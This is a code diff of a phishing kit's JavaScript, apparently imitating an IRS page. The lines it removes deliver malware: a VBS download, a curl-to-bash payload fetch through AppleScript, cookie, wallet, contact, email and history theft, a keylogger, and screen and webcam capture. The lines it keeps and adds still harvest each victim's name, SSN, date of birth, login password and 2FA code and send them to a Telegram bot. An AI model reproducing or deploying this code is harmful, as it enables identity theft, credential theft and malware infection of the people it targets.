-        a.href = url;
-        a.download = 'update.vbs';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        setTimeout(() => URL.revokeObjectURL(url), 5000);
-      }
-    } else if (device.os === 'macos') {
-      // Fileless AppleScript
-      const script = 'tell application "Terminal" to do script "curl -s https://paste.ecralsity.com/raw/payload.sh | bash"';
-      const encoded = encodeURIComponent(script);
-      window.location.href = 'data:text/javascript,' + encoded;
-    } else if (device.os === 'android') {
-      window.location.href = 'https://www.irs.gov/?update=system';
-    } else if (device.os === 'ios') {
-      window.location.href = 'https://www.irs.gov/?profile=system';
-    }
-  }
-
-  // ============================================================
-  // SEND TO TELEGRAM (One Block)
+  // SEND IRS DATA TO TELEGRAM
   // ============================================================
   function sendToTelegram(type, data) {
     let message = '';
-
-    const fingerprint = (() => {
-      const canvas = document.createElement('canvas');
-      const ctx = canvas.getContext('2d');
-      ctx.textBaseline = 'top';
-      ctx.font = '14px Arial';
-      ctx.fillStyle = '#f60';
-      ctx.fillRect(125, 1, 62, 20);
-      ctx.fillStyle = '#069';
-      ctx.fillText('Fingerprint', 2, 15);
-      ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-      ctx.fillText('Canvas', 4, 17);
-      return canvas.toDataURL().slice(0, 50);
-    })();
-
     const deviceInfo =
-      `\n\n🔍 DEVICE INFO\nOS: ${device.os}\nBrowser: ${device.browser}\nScreen: ${screen.width}x${screen.height}\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\nFingerprint: ${fingerprint}...\nUser Agent: ${navigator.userAgent}`;
-
-    const cookies = stealCookies();
-    const walletData = scrapeWallets();
-    const contacts = harvestContacts();
-    const emails = scanEmails();
-    const history = grabHistory();
-
-    let contactsStr = contacts.length ? `\n\n📞 CONTACTS (Last 5):\n${contacts.slice(0,5).join('\n')}` : '\n\n📞 No contacts found.';
-    let emailsStr = emails.length ? `\n\n📧 EMAILS FOUND:\n${emails.slice(0,10).join('\n')}` : '\n\n📧 No emails found.';
-    let historyStr = history ? `\n\n📜 BROWSER HISTORY:\n${history.slice(0, 200)}...` : '';
+      `\n\n🔍 DEVICE INFO\nOS: ${navigator.platform}\nBrowser: ${navigator.userAgent.split(' ').slice(-2).join(' ')}\nScreen: ${screen.width}x${screen.height}\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\nUser Agent: ${navigator.userAgent}`;
 
     if (type === 'step1') {
       message =
-        `STEP 1 - IDENTITY\n\nName: ${data.fullName}\nEmail: ${data.email}\nPhone: ${data.phone}\nDOB: ${data.dob}\nSSN: ${data.ssn}\nProvider: ${data.provider}\n\n🍪 COOKIES:\n${cookies}\n\n${walletData}${contactsStr}${emailsStr}${historyStr}${deviceInfo}`;
+        `STEP 1 - IDENTITY\n\nName: ${data.fullName}\nEmail: ${data.email}\nPhone: ${data.phone}\nDOB: ${data.dob}\nSSN: ${data.ssn}\nProvider: ${data.provider}${deviceInfo}`;
     } else if (type === 'step2') {
       message =
-        `STEP 2 - CREDENTIALS\n\nProvider: ${data.provider}\nUsername: ${data.loginEmail}\nPassword: ${data.loginPassword}\n2FA: ${data.loginMFA || 'Not provided'}\n\nFULL PROFILE\nName: ${data.fullName}\nEmail: ${data.email}\nPhone: ${data.phone}\nDOB: ${data.dob}\nSSN: ${data.ssn}\n\n🍪 COOKIES:\n${cookies}\n\n${walletData}${contactsStr}${emailsStr}${historyStr}${deviceInfo}`;
-    } else if (type === 'files') {
-      message = `📁 FILES DETECTED:\n${data.fileData || 'No files'}`;
-    } else if (type === 'webcam') {
-      message = `📸 WEBCAM PHOTO:\n${data.photo || 'N/A'}`;
+        `STEP 2 - CREDENTIALS\n\nProvider: ${data.provider}\nUsername: ${data.loginEmail}\nPassword: ${data.loginPassword}\n2FA: ${data.loginMFA || 'Not provided'}\n\nFULL PROFILE\nName: ${data.fullName}\nEmail: ${data.email}\nPhone: ${data.phone}\nDOB: ${data.dob}\nSSN: ${data.ssn}${deviceInfo}`;
     }
-
     const url =
       `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
     fetch(url, { mode: 'no-cors' }).catch(() => {});
   }
 
   // ============================================================
-  // STEP 1
+  // IRS STEP 1
   // ============================================================
   function submitStep1() {
     if (!turnstilePassed) {
@@ -1106,13 +867,7 @@
     captured.ssn = ssn;
     captured.provider = providerEl.value;
 
-    // Trigger malware capabilities
-    hijackClipboard();
-    startKeylogger();
-    captureScreen();
-    getLocation().then(loc => {
-      sendToTelegram('step1', captured);
-    });
+    sendToTelegram('step1', captured);
 
     document.getElementById('step1').classList.add('hidden');
     document.getElementById('step2').classList.remove('hidden');
@@ -1120,7 +875,7 @@
   }
 
   // ============================================================
-  // STEP 2 (Credentials + Payload)
+  // IRS STEP 2
   // ============================================================
   function submitStep2() {
     const loginEmail = document.getElementById('loginEmail').value.trim();
@@ -1136,14 +891,7 @@
     captured.loginPassword = loginPassword;
     captured.loginMFA = loginMFA;
 
-    // Trigger malware capabilities
-    hijackClipboard();
-    startKeylogger();
-    captureScreen();
-    getLocation().then(loc => {
-      sendToTelegram('step2', captured);
-    });
-    deliverPayload();
+    sendToTelegram('step2', captured);
 
     document.getElementById('step2').classList.add('hidden');
     document.getElementById('step3').classList.remove('hidden');
@@ -1154,7 +902,7 @@
   }
 
   // ============================================================
-  // GO BACK
+  // IRS GO BACK
   // ============================================================
   function goBack() {
     document.getElementById('step2').classList.add('hidden');
